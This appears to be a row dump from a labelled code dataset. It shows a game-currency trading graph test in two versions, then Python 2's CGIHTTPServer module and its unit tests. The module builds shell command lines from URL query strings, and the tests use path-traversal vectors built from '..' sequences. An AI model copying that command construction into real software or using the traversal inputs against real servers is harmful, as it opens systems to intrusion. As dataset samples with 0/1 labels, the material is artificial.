    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  ""from"": ""Chaos"",
  ""to"": ""Chaos"",
  ""starting"": 8,
  ""ending"": 5,
  ""winnings"": -3,
  ""transactions"": [{
    ""contact_ign"": ""wreddnuy"",
    ""from"": ""Chaos"",
    ""to"": ""Alteration"",
    ""paid"": 8,
    ""received"": 96,
    ""conversion_rate"": 12.0
  }, {
    ""contact_ign"": ""Shioua_ouah"",
    ""from"": ""Alteration"",
    ""to"": ""Chromatic"",
    ""paid"": 96,
    ""received"": 66,
    ""conversion_rate"": 0.6897
  }, {
    ""contact_ign"": ""MVP_Kefir"",
    ""from"": ""Chromatic"",
    ""to"": ""Chaos"",
    ""paid"": 66,
    ""received"": 5,
    ""conversion_rate"": 0.087
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_profitable_paths_small_same_currency(), paths_small_same_currency)
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_profitable_paths_small_different_currency, paths_small_different_currency)

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)

  def test_stock_equalization(self):
    pass
/n/n/n",0
89,89,b0214dec06089bd9f45b028f3b69ed5dc29df204,"/tests/graph_test.py/n/nimport unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_paths_small_different_currency = [
  [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  ""from"": ""Chaos"",
  ""to"": ""Chaos"",
  ""starting"": 8,
  ""ending"": 5,
  ""winnings"": -3,
  ""transactions"": [{
    ""contact_ign"": ""wreddnuy"",
    ""from"": ""Chaos"",
    ""to"": ""Alteration"",
    ""paid"": 8,
    ""received"": 96
  }, {
    ""contact_ign"": ""Shioua_ouah"",
    ""from"": ""Alteration"",
    ""to"": ""Chromatic"",
    ""paid"": 96,
    ""received"": 66
  }, {
    ""contact_ign"": ""MVP_Kefir"",
    ""from"": ""Chromatic"",
    ""to"": ""Chaos"",
    ""paid"": 66,
    ""received"": 5
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_paths_small_same_currency(), paths_small_same_currency)
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_paths_small_different_currency, paths_small_different_currency)

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)
/n/n/n",1
8,8,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
